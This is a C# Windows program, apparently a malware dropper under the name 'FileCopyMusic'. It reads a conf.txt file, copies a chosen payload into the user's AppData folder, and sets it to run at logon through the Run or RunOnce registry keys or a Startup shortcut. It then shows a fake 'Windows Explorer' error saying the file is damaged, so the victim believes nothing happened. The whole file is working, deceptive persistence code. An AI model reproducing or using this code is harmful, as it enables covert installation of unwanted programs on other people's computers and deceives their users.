using System;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text;

namespace FileCopyMusic
{
    static class Program
    {
        static string str;
        [STAThread]
        static void Main()
        {
            bool runned;
            System.Threading.Mutex nmp = new System.Threading.Mutex(true, "{b3c25b4e-7d50-4f9b-a9c4-6a8a8ff0a64e}", out runned);
            if (runned)
            {
                runned = Mth();
                if (str != "") File.WriteAllText(str + @"\res.txt", (runned ? "SUCCESS" : "FAIL"));
                System.Media.SystemSounds.Hand.Play();
                MessageBox.Show("Не удается открыть файл. Возможно, он повреждён.", "Проводник Windows", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        static bool Mth()
        {
            string mypath = Application.StartupPath, currpath = "";
            string[] folders = Directory.GetDirectories(mypath, "*", SearchOption.TopDirectoryOnly), subf;
            foreach (var item in folders)
            {
                subf = Directory.GetFiles(item, "conf.txt", SearchOption.TopDirectoryOnly);
                if (subf.Length != 0) { str = currpath = item; break; }
            }
            if (currpath == "") return false;
            subf = File.ReadAllLines(currpath + @"\conf.txt", Encoding.UTF8);
            if (subf.Length != 4) return false;
            currpath += @"\" + subf[0];
            if (!File.Exists(currpath)) return false;
            try
            {
                mypath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + subf[1];
                File.Copy(currpath, mypath, true);
                if (subf[3] == "reg")
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    rk.SetValue(subf[2], "\"" + mypath + "\"");
                    rk.Close();
                }
                else if (subf[3] == "regonce")
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
                    rk.SetValue(subf[2], "\"" + mypath + "\"");
                    rk.Close();
                }
                else
                {
                    ShortCut.Create(mypath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + subf[2] + ".lnk");
                }
                return true;
            }
            catch { return false; }
        }
        public static class ShortCut
        {
            public static void Create(string PathToFile, string PathToLink)
            {
                ShellLink.IShellLinkW shlLink = ShellLink.CreateShellLink();
                Marshal.ThrowExceptionForHR(shlLink.SetWorkingDirectory(PathToFile.Substring(0, PathToFile.LastIndexOf('\\'))));
                Marshal.ThrowExceptionForHR(shlLink.SetPath(PathToFile));
                Marshal.ThrowExceptionForHR(shlLink.SetIconLocation(PathToFile, 0));
                ((System.Runtime.InteropServices.ComTypes.IPersistFile)shlLink).Save(PathToLink, false);
            }
            static class ShellLink
            {
                [ComImport, Guid("000214F9-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
                internal interface IShellLinkW
                {
                    [PreserveSig]
                    int GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cch, ref IntPtr pfd, uint fFlags);

                    [PreserveSig]
                    int GetIDList(out IntPtr ppidl);

                    [PreserveSig]
                    int SetIDList(IntPtr pidl);

                    [PreserveSig]
                    int GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)]StringBuilder pszName, int cch);

                    [PreserveSig]
                    int SetDescription([MarshalAs(UnmanagedType.LPWStr)]string pszName);

                    [PreserveSig]
                    int GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)]StringBuilder pszDir, int cch);

                    [PreserveSig]
                    int SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)]string pszDir);

                    [PreserveSig]
                    int GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)]StringBuilder pszArgs, int cch);

                    [PreserveSig]
                    int SetArguments([MarshalAs(UnmanagedType.LPWStr)]string pszArgs);
                    [PreserveSig]
                    int GetHotkey(out ushort pwHotkey);

                    [PreserveSig]
                    int SetHotkey(ushort wHotkey);

                    [PreserveSig]
                    int GetShowCmd(out int piShowCmd);

                    [PreserveSig]
                    int SetShowCmd(int iShowCmd);

                    [PreserveSig]
                    int GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)]StringBuilder pszIconPath, int cch, out int piIcon);

                    [PreserveSig]
                    int SetIconLocation([MarshalAs(UnmanagedType.LPWStr)]string pszIconPath, int iIcon);

                    [PreserveSig]
                    int SetRelativePath([MarshalAs(UnmanagedType.LPWStr)]string pszPathRel, uint dwReserved);

                    [PreserveSig]
                    int Resolve(IntPtr hwnd, uint fFlags);

                    [PreserveSig]
                    int SetPath([MarshalAs(UnmanagedType.LPWStr)]string pszFile);
                }

                [ComImport, Guid("00021401-0000-0000-C000-000000000046"), ClassInterface(ClassInterfaceType.None)]
                private class shl_link { }

                internal static IShellLinkW CreateShellLink()
                {
                    return (IShellLinkW)(new shl_link());
                }
            }
        }
    }
}
